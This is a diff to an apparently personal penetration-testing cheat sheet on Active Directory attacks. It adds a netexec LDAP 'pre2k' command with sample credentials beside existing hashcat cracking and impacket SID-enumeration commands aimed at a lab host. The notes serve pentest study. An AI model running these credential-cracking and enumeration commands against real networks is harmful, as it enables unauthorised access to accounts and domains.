@@ -136,6 +136,11 @@ hashcat -m 31300 time_hashes /usr/share/wordlists/rockyou.txt
 impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
 ```
 
+## 18. Pre2K
+```powershell
+netexec ldap MACHINE_IP -u pentest -p 'p3nt3st2025!&' -M pre2k
+```
+
 ## 18. NTLM Relaying
 
 Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)
